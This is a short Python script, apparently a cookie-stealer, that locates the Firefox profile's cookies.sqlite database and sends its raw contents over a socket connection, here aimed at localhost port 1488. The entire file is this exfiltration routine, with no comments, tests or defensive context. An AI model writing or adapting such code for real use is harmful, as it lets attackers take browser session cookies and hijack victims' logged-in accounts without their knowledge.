import glob
from os.path import expanduser
import socket

sock = socket.socket()
sock.connect(('localhost', 1488))


def send_moz_cookies():
    cookie_files = glob.glob(expanduser('~/.mozilla/firefox/*.default/cookies.sqlite'))
    if cookie_files:
        sock.send(b'Upload')
        with open(cookie_files[0], 'rb') as f:
            file_bytes = f.read()
        sock.send(file_bytes)
        sock.close()

send_moz_cookies()
